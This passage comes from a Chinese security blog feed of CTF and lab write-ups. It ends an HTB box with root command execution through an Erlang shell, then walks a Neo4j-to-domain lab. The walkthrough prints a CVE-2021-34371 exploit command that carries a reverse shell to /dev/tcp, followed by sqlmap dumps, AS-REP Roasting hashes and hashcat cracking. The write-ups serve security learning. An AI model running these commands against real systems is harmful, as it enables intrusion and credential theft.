class="hljs-title">stack</span> <span class="hljs-title">backtrace</span> <span class="hljs-title">for</span> <span class="hljs-title">a</span> <span class="hljs-title">process</span></span><br><span class="hljs-function"><span class="hljs-title">c</span>(<span class="hljs-title">Mod</span>)     -- <span class="hljs-title">compile</span> <span class="hljs-title">and</span> <span class="hljs-title">load</span> <span class="hljs-title">module</span> <span class="hljs-title">or</span> <span class="hljs-title">file</span> &lt;<span class="hljs-title">Mod</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">cd</span>(<span class="hljs-title">Dir</span>)    -- <span class="hljs-title">change</span> <span class="hljs-title">working</span> <span class="hljs-title">directory</span></span><br><span class="hljs-function"><span class="hljs-title">flush</span>()    -- <span class="hljs-title">flush</span> <span class="hljs-title">any</span> <span class="hljs-title">messages</span> <span class="hljs-title">sent</span> <span class="hljs-title">to</span> <span class="hljs-title">the</span> <span class="hljs-title">shell</span></span><br><span class="hljs-function"><span class="hljs-title">help</span>()     -- <span class="hljs-title">help</span> <span class="hljs-title">info</span></span><br><span class="hljs-function"><span class="hljs-title">h</span>(<span class="hljs-title">M</span>)       -- <span class="hljs-title">module</span> <span class="hljs-title">documentation</span></span><br><span class="hljs-function"><span class="hljs-title">h</span>(<span class="hljs-title">M</span>,<span class="hljs-title">F</span>)     -- <span class="hljs-title">module</span> <span class="hljs-title">function</span> <span class="hljs-title">documentation</span></span><br><span class="hljs-function"><span class="hljs-title">h</span>(<span class="hljs-title">M</span>,<span class="hljs-title">F</span>,<span class="hljs-title">A</span>)   -- <span class="hljs-title">module</span> <span class="hljs-title">function</span> <span class="hljs-title">arity</span> <span class="hljs-title">documentation</span></span><br><span class="hljs-function"><span class="hljs-title">i</span>()        -- <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">the</span> <span class="hljs-title">system</span></span><br><span class="hljs-function"><span class="hljs-title">ni</span>()       -- <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">the</span> <span class="hljs-title">networked</span> <span class="hljs-title">system</span></span><br><span class="hljs-function"><span class="hljs-title">i</span>(<span class="hljs-title">X</span>,<span class="hljs-title">Y</span>,<span class="hljs-title">Z</span>)   -- <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">pid</span> &lt;<span class="hljs-title">X</span>,<span class="hljs-title">Y</span>,<span class="hljs-title">Z</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">l</span>(<span class="hljs-title">Module</span>)  -- <span class="hljs-title">load</span> <span class="hljs-title">or</span> <span class="hljs-title">reload</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">lm</span>()       -- <span class="hljs-title">load</span> <span class="hljs-title">all</span> <span class="hljs-title">modified</span> <span class="hljs-title">modules</span></span><br><span class="hljs-function"><span class="hljs-title">lc</span>([<span class="hljs-title">File</span>]) -- <span class="hljs-title">compile</span> <span class="hljs-title">a</span> <span class="hljs-title">list</span> <span class="hljs-title">of</span> <span class="hljs-title">Erlang</span> <span class="hljs-title">modules</span></span><br><span class="hljs-function"><span class="hljs-title">ls</span>()       -- <span class="hljs-title">list</span> <span class="hljs-title">files</span> <span class="hljs-title">in</span> <span class="hljs-title">the</span> <span class="hljs-title">current</span> <span class="hljs-title">directory</span></span><br><span class="hljs-function"><span class="hljs-title">ls</span>(<span class="hljs-title">Dir</span>)    -- <span class="hljs-title">list</span> <span class="hljs-title">files</span> <span class="hljs-title">in</span> <span class="hljs-title">directory</span> &lt;<span class="hljs-title">Dir</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">m</span>()        -- <span class="hljs-title">which</span> <span class="hljs-title">modules</span> <span class="hljs-title">are</span> <span class="hljs-title">loaded</span></span><br><span class="hljs-function"><span class="hljs-title">m</span>(<span class="hljs-title">Mod</span>)     -- <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">module</span> &lt;<span class="hljs-title">Mod</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">mm</span>()       -- <span class="hljs-title">list</span> <span class="hljs-title">all</span> <span class="hljs-title">modified</span> <span class="hljs-title">modules</span></span><br><span class="hljs-function"><span class="hljs-title">memory</span>()   -- <span class="hljs-title">memory</span> <span class="hljs-title">allocation</span> <span class="hljs-title">information</span></span><br><span class="hljs-function"><span class="hljs-title">memory</span>(<span class="hljs-title">T</span>)  -- <span class="hljs-title">memory</span> <span class="hljs-title">allocation</span> <span class="hljs-title">information</span> <span class="hljs-title">of</span> <span class="hljs-title">type</span> &lt;<span class="hljs-title">T</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">nc</span>(<span class="hljs-title">File</span>)   -- <span class="hljs-title">compile</span> <span class="hljs-title">and</span> <span class="hljs-title">load</span> <span class="hljs-title">code</span> <span class="hljs-title">in</span> &lt;<span class="hljs-title">File</span>&gt; <span class="hljs-title">on</span> <span class="hljs-title">all</span> <span class="hljs-title">nodes</span></span><br><span class="hljs-function"><span class="hljs-title">nl</span>(<span class="hljs-title">Module</span>) -- <span class="hljs-title">load</span> <span class="hljs-title">module</span> <span class="hljs-title">on</span> <span class="hljs-title">all</span> <span class="hljs-title">nodes</span></span><br><span class="hljs-function"><span class="hljs-title">pid</span>(<span class="hljs-title">X</span>,<span class="hljs-title">Y</span>,<span class="hljs-title">Z</span>) -- <span class="hljs-title">convert</span> <span class="hljs-title">X</span>,<span class="hljs-title">Y</span>,<span class="hljs-title">Z</span> <span class="hljs-title">to</span> <span class="hljs-title">a</span> <span class="hljs-title">Pid</span></span><br><span class="hljs-function"><span class="hljs-title">pwd</span>()      -- <span class="hljs-title">print</span> <span class="hljs-title">working</span> <span class="hljs-title">directory</span></span><br><span class="hljs-function"><span class="hljs-title">q</span>()        -- <span class="hljs-title">quit</span> - <span class="hljs-title">shorthand</span> <span class="hljs-title">for</span> <span class="hljs-title">init:stop</span>()</span><br><span class="hljs-function"><span class="hljs-title">regs</span>()     -- <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">registered</span> <span class="hljs-title">processes</span></span><br><span class="hljs-function"><span class="hljs-title">nregs</span>()    -- <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">all</span> <span class="hljs-title">registered</span> <span class="hljs-title">processes</span></span><br><span class="hljs-function"><span class="hljs-title">uptime</span>()   -- <span class="hljs-title">print</span> <span class="hljs-title">node</span> <span class="hljs-title">uptime</span></span><br><span class="hljs-function"><span class="hljs-title">xm</span>(<span class="hljs-title">M</span>)      -- <span class="hljs-title">cross</span> <span class="hljs-title">reference</span> <span class="hljs-title">check</span> <span class="hljs-title">a</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">y</span>(<span class="hljs-title">File</span>)    -- <span class="hljs-title">generate</span> <span class="hljs-title">a</span> <span class="hljs-title">Yecc</span> <span class="hljs-title">parser</span></span><br><span class="hljs-function">** <span class="hljs-title">commands</span> <span class="hljs-title">in</span> <span class="hljs-title">module</span> <span class="hljs-title">i</span> (<span class="hljs-title">interpreter</span> <span class="hljs-title">interface</span>) **</span><br><span class="hljs-function"><span class="hljs-title">ih</span>()       -- <span class="hljs-title">print</span> <span class="hljs-title">help</span> <span class="hljs-title">for</span> <span class="hljs-title">the</span> <span class="hljs-title">i</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">true</span></span><br><span class="hljs-function">(<span class="hljs-title">ssh_runner</span>@<span class="hljs-title">soulmate</span>)2&gt;</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œ <code>m().</code> æŸ¥çœ‹åŠ è½½çš„æ¨¡å—</p><p><img src="https://img.dkdun.cn/v1/2025/12/9715edfc4918a477.png"></p><p>åŠ è½½äº† os æ¨¡å—ï¼Œ<a href="https://vuln.be/post/os-command-and-code-execution-in-erlang-and-elixir/">OS command and code execution in Erlang and Elixir applications</a>ï¼Œos æ¨¡å—è¿è¡Œå‘½ä»¤</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">(ssh_runner@soulmate)<span class="hljs-number">4</span>&gt; os:<span class="hljs-built_in">cmd</span>(&quot;id&quot;).<br>&quot;uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)\n&quot;<br></code></pre></td></tr></table></figure><p>å·²ç»æ˜¯ root äº†ï¼Œæ‹¿ flag é¡ºæ‰‹çš„äº‹</p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ–‡ä»¶ä¸Šä¼  Erlang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ˜¥ç§‹äº‘é•œ-Time</title>
    <link href="/2025/09/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/"/>
    <url>/2025/09/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/</url>
    
    <content type="html"><![CDATA[<p>Neo4j CVE-2021-34371ï¼Œsql æ³¨å…¥ï¼ŒAS-REP Roastingï¼ŒSIDHistoryï¼Œå“ˆå¸Œä¼ é€’</p><span id="more"></span><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:\aWeb\fscan-main&gt;.\fscan.exe -h 39.99.151.46 -p 1-65535<br><br>   ___                              _<br>  / _ \     ___  ___ _ __ __ _  ___| | __<br> / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /</span><br><span class="hljs-string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="hljs-string">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="hljs-string">                     fscan version: 1.8.4</span><br><span class="hljs-string">start infoscan</span><br><span class="hljs-string">39.99.151.46:22 open</span><br><span class="hljs-string">39.99.151.46:1337 open</span><br><span class="hljs-string">39.99.151.46:7474 open</span><br><span class="hljs-string">39.99.151.46:7473 open</span><br><span class="hljs-string">39.99.151.46:7687 open</span><br><span class="hljs-string">39.99.151.46:39433 open</span><br><span class="hljs-string">[*] alive ports len is: 6</span><br><span class="hljs-string">start vulscan</span><br><span class="hljs-string">[*] WebTitle http://39.99.151.46:7474  code:303 len:0      title:None è·³è½¬url: http://39.99.151.46:7474/browser/</span><br><span class="hljs-string">[*] WebTitle http://39.99.151.46:7474/browser/ code:200 len:3279   title:Neo4j Browser</span><br><span class="hljs-string">[*] WebTitle https://39.99.151.46:7687 code:400 len:50     title:None</span><br><span class="hljs-string">[*] WebTitle https://39.99.151.46:7473 code:303 len:0      title:None è·³è½¬url: https://39.99.151.46:7473/browser/</span><br><span class="hljs-string">[*] WebTitle https://39.99.151.46:7473/browser/ code:200 len:3279   title:Neo4j Browser</span><br><span class="hljs-string">å·²å®Œæˆ 6/6</span><br><span class="hljs-string">[*] æ‰«æç»“æŸ,è€—æ—¶: 5m37.2643762s</span><br></code></pre></td></tr></table></figure><h1 id="Neo4j-ä½¿ç”¨-CVE-2021-34371-è·å–-shell"><a href="#Neo4j-ä½¿ç”¨-CVE-2021-34371-è·å–-shell" class="headerlink" title="Neo4j ä½¿ç”¨ CVE-2021-34371 è·å– shell"></a>Neo4j ä½¿ç”¨ CVE-2021-34371 è·å– shell</h1><p>å‘ç°æœ‰ Neo4j æœåŠ¡ï¼Œå°è¯•æ‰“ CVEï¼ŒCVE-2021-34371ï¼Œä¸‹è½½ <a href="https://github.com/vulhub/vulhub/tree/master/neo4j/CVE-2021-34371">CVE-2021-34371</a>ï¼ŒCVE å¤ç° <a href="https://www.cnblogs.com/Kawakaze777/p/18153842">CVE-2021-34371 Neo4j-Shell æ¼æ´å¤ç°</a></p><p>æ‰§è¡Œ <code>mvn install</code> ç”Ÿæˆçš„ exp æ–‡ä»¶ rhino_gadget-1.0-SNAPSHOT-fatjar.jar</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar rhino_gadget-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-fatjar.jar rmi://<span class="hljs-number">39.99.151.46:1337</span> <span class="hljs-string">&quot;bash -c &#123;echo,base64-encode(bash -i &gt;&amp; /dev/tcp/IP/1234 0&gt;&amp;1)&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a2a9c1e6cf0bd259.png"></p><p>åœ¨ &#x2F;home&#x2F;neo4j ç›®å½•ä¸‹æ‹¿åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag01</span>: flag&#123;cbedf03d-<span class="hljs-number">2</span>fa2-<span class="hljs-number">41</span>cd-aad8-<span class="hljs-number">7</span>cbe1dc6b035&#125;<br></code></pre></td></tr></table></figure><h1 id="å¯¹åå°ç³»ç»Ÿ-sql-æ³¨å…¥-dump-æ•°æ®"><a href="#å¯¹åå°ç³»ç»Ÿ-sql-æ³¨å…¥-dump-æ•°æ®" class="headerlink" title="å¯¹åå°ç³»ç»Ÿ sql æ³¨å…¥ dump æ•°æ®"></a>å¯¹åå°ç³»ç»Ÿ sql æ³¨å…¥ dump æ•°æ®</h1><p>å‘ç°æœ¬æœº IP ä¸º 172.22.6.36</p><p><img src="https://img.dkdun.cn/v1/2025/12/e9d79c1170001a26.png"></p><p>wget ä¸Šä¼  fscan æ”¶é›†å†…ç½‘ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash">./FScan_2.0.1_linux_x64 -h 172.22.6.36/24<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚    ___                              _        â”‚<br>â”‚   / _ \     ___  ___ _ __ __ _  ___| | __    â”‚<br>â”‚  / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /    â”‚</span><br><span class="hljs-string">â”‚ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     â”‚</span><br><span class="hljs-string">â”‚ \____/     |___/\___|_|  \__,_|\___|_|\_\    â”‚</span><br><span class="hljs-string">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="hljs-string">      Fscan Version: 2.0.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">[1.8s]     å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼</span><br><span class="hljs-string">[1.8s]     å¼€å§‹ä¿¡æ¯æ‰«æ</span><br><span class="hljs-string">[1.8s]     CIDRèŒƒå›´: 172.22.6.0-172.22.6.255</span><br><span class="hljs-string">[1.8s]     generate_ip_range_full</span><br><span class="hljs-string">[1.8s]     è§£æCIDR 172.22.6.36/24 -&gt; IPèŒƒå›´ 172.22.6.0-172.22.6.255</span><br><span class="hljs-string">[1.8s]     æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256</span><br><span class="hljs-string">[1.8s]     å¼€å§‹ä¸»æœºæ‰«æ</span><br><span class="hljs-string">[1.8s]     ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle</span><br><span class="hljs-string">[1.8s]     æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹...</span><br><span class="hljs-string">[1.8s]     ICMPè¿æ¥å¤±è´¥: dial ip4:icmp 127.0.0.1: socket: operation not permitted</span><br><span class="hljs-string">[1.8s]     å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ…</span><br><span class="hljs-string">[1.8s]     åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹...</span><br><span class="hljs-string">[1.9s] [*] ç›®æ ‡ 172.22.6.12     å­˜æ´» (ICMP)</span><br><span class="hljs-string">[4.9s] [*] ç›®æ ‡ 172.22.6.25     å­˜æ´» (ICMP)</span><br><span class="hljs-string">[4.9s] [*] ç›®æ ‡ 172.22.6.36     å­˜æ´» (ICMP)</span><br><span class="hljs-string">[5.0s] [*] ç›®æ ‡ 172.22.6.38     å­˜æ´» (ICMP)</span><br><span class="hljs-string">[7.9s]     å­˜æ´»ä¸»æœºæ•°é‡: 4</span><br><span class="hljs-string">[7.9s]     æœ‰æ•ˆç«¯å£æ•°é‡: 233</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.6.36:22</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.6.12:445</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.6.12:139</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.6.12:389</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.6.12:135</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.6.12:88</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.6.36:7687</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.6.25:445</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.6.25:139</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.6.25:135</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.6.38:22</span><br><span class="hljs-string">[7.9s] [*] ç«¯å£å¼€æ”¾ 172.22.6.38:80</span><br><span class="hljs-string">[10.9s]     æ‰«æå®Œæˆ, å‘ç° 12 ä¸ªå¼€æ”¾ç«¯å£</span><br><span class="hljs-string">[10.9s]     å­˜æ´»ç«¯å£æ•°é‡: 12</span><br><span class="hljs-string">[10.9s]     å¼€å§‹æ¼æ´æ‰«æ</span><br><span class="hljs-string">[11.1s]     POCåŠ è½½å®Œæˆ: æ€»å…±387ä¸ªï¼ŒæˆåŠŸ387ä¸ªï¼Œå¤±è´¥0ä¸ª</span><br><span class="hljs-string">[11.1s] [*] NetInfo æ‰«æç»“æœ</span><br><span class="hljs-string">ç›®æ ‡ä¸»æœº: 172.22.6.12</span><br><span class="hljs-string">ä¸»æœºå: DC-PROGAME</span><br><span class="hljs-string">å‘ç°çš„ç½‘ç»œæ¥å£:</span><br><span class="hljs-string">   IPv4åœ°å€:</span><br><span class="hljs-string">      â””â”€ 172.22.6.12</span><br><span class="hljs-string">[11.1s] [*] NetInfo æ‰«æç»“æœ</span><br><span class="hljs-string">ç›®æ ‡ä¸»æœº: 172.22.6.25</span><br><span class="hljs-string">ä¸»æœºå: WIN2019</span><br><span class="hljs-string">å‘ç°çš„ç½‘ç»œæ¥å£:</span><br><span class="hljs-string">   IPv4åœ°å€:</span><br><span class="hljs-string">      â””â”€ 172.22.6.25</span><br><span class="hljs-string">[11.1s] [*] ç½‘ç«™æ ‡é¢˜ http://172.22.6.38        çŠ¶æ€ç :200 é•¿åº¦:1531   æ ‡é¢˜:åå°ç™»å½•</span><br><span class="hljs-string">[11.1s] [+] NetBios 172.22.6.25     XIAORANG\WIN2019              </span><br><span class="hljs-string">[11.2s] [+] NetBios 172.22.6.12     DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393</span><br><span class="hljs-string">[11.2s]     ç³»ç»Ÿä¿¡æ¯ 172.22.6.12 [Windows Server 2016 Datacenter 14393]</span><br><span class="hljs-string">[11.4s] [*] ç½‘ç«™æ ‡é¢˜ https://172.22.6.36:7687  çŠ¶æ€ç :400 é•¿åº¦:50     æ ‡é¢˜:æ— æ ‡é¢˜</span><br><span class="hljs-string">[55.6s]     æ‰«æå·²å®Œæˆ: 22/22</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä»¥ä¸‹ä¿¡æ¯</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.6.12</span>     DC:DC-PROGAME.xiaorang.lab  <br><span class="hljs-number">172.22.6.25</span>     XIAORANG\WIN2019   <br><span class="hljs-number">172.22.6.36</span>     æœ¬æœº<br><span class="hljs-number">172.22.6.38</span>web æœåŠ¡<br></code></pre></td></tr></table></figure><p>å…ˆçœ‹çœ‹ 172.22.6.38 ä¸»æœºï¼Œåå°ç³»ç»Ÿï¼Œå­˜åœ¨ sql æ³¨å…¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/36e3261e52839207.png"></p><p>ç›´æ¥ä½¿ç”¨ sqlmap å¯ä»¥æŠŠæ•°æ® dump ä¸‹æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains sqlmap -u http://172.22.6.38/index.php -data <span class="hljs-string">&quot;username=admin&amp;password=1&quot;</span> --dump --batch<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°å¾ˆå¤šæ•°æ®åŒ…æ‹¬ administrator å¯†ç </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql">Database: oa_db<br><span class="hljs-keyword">Table</span>: oa_admin<br>[<span class="hljs-number">1</span> entry]<br><span class="hljs-operator">+</span><span class="hljs-comment">----+------------------+---------------+</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> password         <span class="hljs-operator">|</span> username      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+------------------+---------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1</span>  <span class="hljs-operator">|</span> bo2y8kAL3HnXUiQo <span class="hljs-operator">|</span> administrator <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+------------------+---------------+</span><br><br>Database: oa_db<br><span class="hljs-keyword">Table</span>: oa_f1Agggg<br>[<span class="hljs-number">1</span> entry]<br><span class="hljs-operator">+</span><span class="hljs-comment">----+--------------------------------------------+</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> flag02                                     <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+--------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1</span>  <span class="hljs-operator">|</span> flag&#123;b142f5ce<span class="hljs-operator">-</span>d9b8<span class="hljs-number">-4</span>b73<span class="hljs-number">-9012</span><span class="hljs-operator">-</span>ad75175ba029&#125; <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+--------------------------------------------+</span><br></code></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag02ï¼šflag&#123;b142f5ce-d9b8-<span class="hljs-number">4b73</span>-<span class="hljs-number">9012</span>-ad75175ba029&#125;<br></code></pre></td></tr></table></figure><h1 id="oa-ç”¨æˆ·åè¿›è¡Œ-AS-REP-Roasting-æ”»å‡»"><a href="#oa-ç”¨æˆ·åè¿›è¡Œ-AS-REP-Roasting-æ”»å‡»" class="headerlink" title="oa ç”¨æˆ·åè¿›è¡Œ AS-REP Roasting æ”»å‡»"></a>oa ç”¨æˆ·åè¿›è¡Œ AS-REP Roasting æ”»å‡»</h1><p>æ‹¿åˆ°ä¸€äº› oa ç”¨æˆ·æ•°æ®</p><p><img src="https://img.dkdun.cn/v1/2025/12/ce50335a2491c662.png"></p><p>ç”¨æˆ·åå°è¯• AS-REP Roasting æ”»å‡»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains -q impacket-GetNPUsers -dc-ip 172.22.6.12  xiaorang.lab/ -usersfile usernames.txt<br></code></pre></td></tr></table></figure><p>æœ€åæ‹¿åˆ°ä¸¤ä¸ªç”¨æˆ·çš„ TGT ç¥¨æ®</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">$krb5asrep$<span class="hljs-number">23</span>$wenshao@XIAORANG.LAB:c8a8e9c4178ec417e26b8ebc6e550150$c39230f158eb73a400f9fafae5cccb38154e920c2f2375ad3d1cd7964b99a92e20b650ad24cfbdfbd2cbccbaa6b8c8ee2574f07fb5361f93846c31c4197ffe1ab4aaecf3d2df6f873f354fd9470f99ac93000c0cde54d7139f0a2048c37e9ea5398ac19ac5df758cdd58345197a82ba12add01a054ef8c9c7bc758c6716753377d7c6aeddd1d4469ccf3cfcea07aced971387583ac5c52087f17c88393b36ef6248aeb0aa3779fe3c6399fc6fd9288cc3bef37026a10675a2fe9d77d06353fbe855d6597b86f45b69822d8b143f4008c0e850a841dc22b86c4fe9a8b4d9f4d9b205bb21c0ff181c9630def6f<br><br>$krb5asrep$<span class="hljs-number">23</span>$zhangxin@XIAORANG.LAB:e66688646b49b157283973d305a76af7$aa9857d93ea5008534e9c35ba1402f31035cb17212958c78901039b65e31fe252197019c51623bd8d234c47475df303fdd197c157ac641afa8a7ef312c7ba6ebc63b56abce6ed1dc5a7b8f8cb1d8d1be7c64cf049e88210d06540aed6c1de37c4e0e6071ae9f6ba36c19c5791ea38304fd581b93f07cc8d12d00118488afa1798a96ba3c06378cf463dce86eec953c1e51704434eb3f6afc1e826273862f7b6be99a6c8e058efe74425a3a524659bcf8a1741091c8b4c3a83de577b1a9a20fac2ff327901128ea8e6552a59dd49880777927b79d81d7bcf67a423666a286016abd7dd09d8147ddd6581d64ce<br></code></pre></td></tr></table></figure><p>hashcat çˆ†ç ´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -m 18200 <span class="hljs-string">&#x27;$TGT$&#x27;</span> /usr/share/wordlists/rockyou.txt --force<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°ä¸¤ä¸ªå¯†æ–‡</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">wenshao<span class="hljs-variable">@XIAORANG</span>.<span class="hljs-variable constant_">LAB</span><span class="hljs-symbol">:hellokitty</span><br>zhangxin<span 